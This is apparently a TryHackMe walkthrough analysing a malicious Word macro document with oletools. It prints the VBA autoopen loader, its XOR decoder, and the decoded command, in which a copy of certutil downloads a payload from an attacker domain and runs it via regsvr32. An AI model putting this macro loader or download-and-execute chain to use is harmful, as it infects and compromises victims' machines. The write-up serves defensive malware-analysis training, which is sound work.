# Try Hack Me - Squid Game, attacker 3

This is part 3 of a [5-part series of walkthroughs](./squid-game.md) for Try Hack Me's Squid Game room.

## 1. Identifying macros - oleid, oledump

Following on from [attacker1](./attacker1/attacker1.md) and [attacker2](./attacker2/attacker2.md), we can make some assumptions about our sample - namely that it is a .doc file and likely contains malicious VBA macros. Again, we can run [oleid](https://github.com/decalage2/oletools/wiki/oleid) to confirm this assumption : 

```console
remnux@remnux:~$ oleid attacker3.doc 
...snip...
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
...snip...
```

and [oledump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py) to tell us where these macros are located in the document's streams : 

```console
remnux@remnux:~$ oledump.py attacker3.doc 
A: word/vbaProject.bin
 A1:       423 'PROJECT'
 A2:        53 'PROJECTwm'
 A3: M    2017 'VBA/T'
 A4: m    1127 'VBA/ThisDocument'
 A5:      2976 'VBA/_VBA_PROJECT'
 A6:      1864 'VBA/__SRP_0'
 A7:       190 'VBA/__SRP_1'
 A8:       348 'VBA/__SRP_2'
 A9:       106 'VBA/__SRP_3'
A10: M    1291 'VBA/d'
A11:       723 'VBA/dir'
```

Extracting the macros found in streams A3, A4, and A10 with oledump's "-s" flag, we find that A4 defines some generic variables for the VBA environment, while A3 and A10 contain likely malicious code. Given that the autoopen() subprocedure is found in A3, we'll start our analysis there. 

## 2. Manual analysis, stream A3

(You can get pretty much everything we find in these 2 manual analysis sections by running [ViperMonkey](https://github.com/decalage2/ViperMonkey) on the sample, but this way is more fun.)

Stream A3 contains the following VBA code :

```vb
Sub autoopen()
    LG = h("12%2%...snip...%77")

    Dim XN As New WshShell
    Call XN.run("cmd /c set u=tutil&&call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe", 0)
    Call XN.run(LG, 0)
End Sub
```

We can clean this up manually to have a better idea of what the code might be doing (but this refactor won't necessarily run as valid VBA) : 

```vb
Sub autoopen()
    decoded_command = decodeFunction("LONG-ENCODED-STRING")
    Dim shellInstance as New WshShell
    Call shellInstance.run("cmd /c copy C:\Windows\System32\certutil.exe C:\ProgramData\1.exe", 0)
    Call shellInstance.run(decoded_command, 0)
End Sub
```

So step by step, the code takes the following actions : 

1. Passes an apparently encrypted / encoded string to the function "h" - we haven't found this function yet, but it might be safe to assume that it decrypts / decodes the string.
2. Creates a new [Shell](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function) instance capable of executing commands on the host.
3. Runs a command using the shell instance, calling cmd.exe to make a copy of "C:\Windows\System32\certutil.exe" at "C:\ProgramData\1.exe". [Certutils](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) ships with Windows and is used in the management of digital certificates - it is also commonly used in malware as a LOLbin due to it's ability to make HTTP requests. The "0" at the end of the call to Shell.run tells shell to hide the command line window, reducing the likelihood of detection. 
4. Runs the decoded command using the shell instance, again hiding the resulting command line window.

To fully understand what the code is doing and what it might want with certutils we need to find the function "h" that decodes / decrypts the second command. Luckily for us, this function is defined in stream A10.

## 3. Manual analysis, stream A10

*Q1 Provide the executable name being downloaded.*  
*Q2 What program is used to run the executable?*  
*Q3 Provide the malicious URI included in the maldoc that was used to download the binary.*  
*Q4 What folder does the binary gets dropped in?*  
*Q5 Which stream executes the binary that was downloaded?*  

Stream A10 contains the following VBA code :

```vb
Function h(ju)
    eR = Split(ju, "%")
    For lc = 0 To UBound(eR)
        hh = hh & Chr(eR(lc) Xor 111)
        Next lc
        h = hh
End Function

Function vY()
    vY = "util"
End Function
```

Ignoring the "vY" function (this doesn't seem to be used anywhere in the code), the "h" function appears to be a basic XOR implementation, removing the "%" character from the previously discovered string and XORing each remaining character against the key "111". We can decode the encoded command simply by implementing the same XOR function : 

```python
CIPHER = "12%2%11%79%64%12%79%77%28%10%..."
KEY = 111

cipher_chars = CIPHER.split('%')
plain = ''.join([chr(int(c) ^ KEY) for c in cipher_chars])
print(plain)
```
This gives us the following string : 

```
cmd /c "set u=url&&call C:\ProgramData\1.exe /%u%^c^a^c^h^e^ /f^ hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp"
```

which we can clean up a little more : 

```
cmd /c C:\ProgramData\1.exe /urlcache /f hxxp://8cfayv.com/bolb/jaent.php?l=liut6.cab C:\ProgramData\1.tmp && call regsvr32 C:\ProgramData\1.tmp
```

So this is the string that is passed to Shell.run() at the last line of the autoopen() function in stream A3. It calls cmd.exe to call certutils (or the copy of certutils at "C:\ProgramData\1.exe") with the "/urlcache /f" flags - [this makes certutils make a HTTP request](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil#-urlcache) to the attacker-controlled domain. The response to this HTTP request is saved in `C:\ProgramData\1.tmp` and the resulting file is executed by yet another LOLbin commonly used in malware, [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32).

This is as far as we can go with the sample - we've found an IOC in the attacker controlled-domain that serves the malicious executable and the likely location of an additional sample at `C:\ProgramData\1.tmp`.